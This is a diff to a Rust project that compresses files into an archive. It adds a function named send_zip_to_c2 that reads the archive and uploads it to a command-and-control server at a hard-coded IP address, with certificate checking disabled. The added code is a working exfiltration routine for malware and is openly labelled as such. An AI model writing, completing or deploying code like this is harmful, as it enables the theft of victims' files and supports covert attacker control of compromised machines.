@@ -1,10 +1,13 @@
 use reqwest::Error;
+use reqwest::{multipart, Client};
 use serde::Deserialize;
 use std::fs::File;
 use std::io::prelude::*;
 use std::io::Read;
+use std::path::Path;
 use std::path::PathBuf;
 use tempfile::NamedTempFile;
+use tokio::fs;
 use zip::result::ZipResult;
 use zip::write::SimpleFileOptions;
 use zip::{AesMode, CompressionMethod};
@@ -79,5 +82,44 @@ pub async fn zip_file(filename: &PathBuf) -> ZipResult<()> {
     // DEBUG
     // tmp_archive.persist("archive.zip");
 
+    Ok(())
+}
+
+pub async fn send_zip_to_c2(filepath: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let client = Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()?;
+
+    let file_name = Path::new(filepath)
+        .file_name()
+        .and_then(|n| n.to_str())
+        .unwrap_or("file.zip")
+        .to_string();
+
+    let file_bytes = match fs::read(filepath).await {
+        Ok(bytes) => bytes,
+        Err(e) => {
+            eprintln!(
+                "Erreur lors de la lecture du fichier '{}': {:?}",
+                filepath, e
+            );
+            return Err(Box::new(e));
+        }
+    };
+
+    let form = multipart::Form::new().part(
+        "file",
+        multipart::Part::bytes(file_bytes)
+            .file_name(file_name)
+            .mime_str("application/zip")?,
+    );
+
+    let res = client
+        .post("https://172.28.161.20:3030/directives")
+        .multipart(form)
+        .send()
+        .await?;
+
+    println!("Status: {}", res.status());
     Ok(())
 }
